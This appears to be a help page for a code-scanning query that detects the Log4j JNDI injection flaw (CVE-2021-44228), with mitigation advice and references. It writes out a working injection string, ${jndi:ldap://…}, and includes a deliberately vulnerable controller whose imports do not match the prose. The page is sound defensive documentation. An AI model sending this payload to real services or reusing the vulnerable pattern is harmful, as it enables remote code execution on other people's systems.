# Potential Log4J LDAP JNDI injection (CVE-2021-44228)
This query flags up situations in which untrusted user data is included in Log4j messages. If an application uses a Log4j version prior to 2.15.0, using untrusted user data in log messages will make an application vulnerable to remote code execution through Log4j's LDAP JNDI parser (CVE-2021-44228).

As per Apache's Log4j security guide: Apache Log4j2 &lt;=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From Log4j 2.15.0, this behavior has been disabled by default. Note that this query will not try to determine which version of Log4j is used.


## Recommendation
This issue was remediated in Log4j v2.15.0. The Apache Logging Services team provides the following mitigation advice:

In previous releases (&gt;=2.10) this behavior can be mitigated by setting system property `log4j2.formatMsgNoLookups` to `true` or by removing the `JndiLookup` class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).

You can manually check for use of affected versions of Log4j by searching your project repository for Log4j use, which is often in a pom.xml file.

Where possible, upgrade to Log4j version 2.15.0. If you are using Log4j v1 there is a migration guide available.

Please note that Log4j v1 is End Of Life (EOL) and will not receive patches for this issue. Log4j v1 is also vulnerable to other RCE vectors and we recommend you migrate to Log4j 2.15.0 where possible.

If upgrading is not possible, then ensure the -Dlog4j2.formatMsgNoLookups=true system property is set on both client- and server-side components.


## Example
In this example, a username, provided by the user, is logged using `logger.warn` (from `org.apache.logging.log4j.Logger`). If a malicious user provides `${jndi:ldap://127.0.0.1:1389/a}` as a username parameter, Log4j will make a JNDI lookup on the specified LDAP server and potentially load arbitrary code.


```java
package com.example.restservice;

import org.apache.commons.logging.log4j.Logger;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class Log4jJndiInjection {

    private final Logger logger = LogManager.getLogger();

    @GetMapping("/bad")
    public String bad(@RequestParam(value = "username", defaultValue = "name") String username) {
        logger.warn("User:'{}'", username);
        return username;
    }
}

```

## References
* GitHub Advisory Database: [Remote code injection in Log4j](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q).
* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
* Common Weakness Enumeration: [CWE-74](https://cwe.mitre.org/data/definitions/74.html).
* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).
